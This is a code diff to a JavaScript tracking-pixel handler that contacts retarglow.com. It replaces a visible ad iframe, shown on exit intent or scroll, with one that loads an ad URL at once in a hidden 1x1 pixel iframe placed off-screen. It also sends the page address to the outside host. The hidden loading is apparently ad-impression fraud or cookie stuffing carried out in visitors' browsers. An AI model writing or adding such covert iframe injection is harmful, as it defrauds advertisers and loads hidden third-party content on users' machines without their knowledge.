@@ -27,63 +27,36 @@ exports.handler = async (event) => {
       cm: { _r: _r }
     };
 
+    // 1. Fire tracking pixel
     fetch("https://retarglow.com/track", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(data)
     });
 
-    let triggered = false;
+    // 2. Fetch matching ad URL
+    fetch("https://retarglow.com/getad", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ u: location.href, cm: data.cm, country: null })
+    })
+    .then(res => res.json())
+    .then(json => {
+      if (json.ad_url) {
+        var finalUrl = json.ad_url.replace("{{_r}}", _r);
 
-    function injectIframe(url){
-      if (triggered || !url) return;
-      triggered = true;
-
-      var iframe = document.createElement('iframe');
-      iframe.src = url;
-      iframe.style.width = "100%";
-      iframe.style.height = "600px";
-      iframe.style.border = "none";
-      iframe.style.marginTop = "20px";
-      document.body.appendChild(iframe);
-    }
-
-    async function getAdAndInject(){
-      if (triggered) return;
-
-      try {
-        const res = await fetch("https://retarglow.com/getad", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            u: location.href,
-            cm: data.cm,
-            country: null
-          })
-        });
-
-        const json = await res.json();
-        if (json.ad_url) {
-          const finalUrl = json.ad_url.replace("{{_r}}", _r);
-          injectIframe(finalUrl);
-        }
-      } catch (err) {
-        console.warn("❌ Ad Fetch Error:", err);
+        // Inject invisible iframe
+        var iframe = document.createElement("iframe");
+        iframe.style.width = "1px";
+        iframe.style.height = "1px";
+        iframe.style.border = "0";
+        iframe.style.position = "absolute";
+        iframe.style.left = "-9999px";
+        iframe.src = finalUrl;
+        document.body.appendChild(iframe);
       }
-    }
-
-    document.addEventListener("mouseout", function (e) {
-      if (!e.toElement && !e.relatedTarget && e.clientY <= 0 && !triggered) {
-        getAdAndInject();
-      }
-    });
-
-    window.addEventListener("scroll", function () {
-      if (triggered) return;
-      if (window.scrollY / document.body.scrollHeight > 0.5) {
-        getAdAndInject();
-      }
-    });
+    })
+    .catch(err => console.warn("❌ Ad Fetch Error:", err));
 
   } catch (n) {
     console.error("Pixel Error:", n);
